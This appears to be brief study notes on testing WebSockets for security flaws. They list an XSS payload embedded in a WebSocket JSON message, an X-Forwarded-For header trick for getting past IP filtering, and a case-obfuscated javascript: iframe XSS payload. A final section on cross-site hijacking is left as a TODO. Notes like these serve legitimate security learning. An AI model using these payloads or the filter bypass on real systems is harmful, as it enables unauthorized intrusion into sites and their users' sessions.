# Testing for WebSockets security vulnerabilities

## Manipulating WebSocket messages to exploit vulnerabilities
```
{"message":"bbb<img src=1 onerror='alert(1)'>"}
```

## Manipulating the WebSocket handshake to exploit vulnerabilities
Bypass IP filter using `X-Forwarded-For: 1.1.1.1`
WS Message:
```
<iframe src='jAvAsCripT:alert`1`'></iframe>
```

## Cross-site WebSocket hijacking
TODO: Burp Suite Professional